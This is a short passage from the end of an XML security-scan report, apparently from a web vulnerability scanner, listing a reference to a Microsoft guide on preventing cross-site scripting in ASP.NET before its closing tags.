          <Database><![CDATA[How To: Prevent Cross-Site Scripting in ASP.NET]]></Database>
          <URL><![CDATA[http://msdn.microsoft.com/en-us/library/ms998274.aspx]]></URL>
        </Reference>
       </References>
      </ReportItem>
		</ReportItems>
 </Scan>
</ScanGroup>
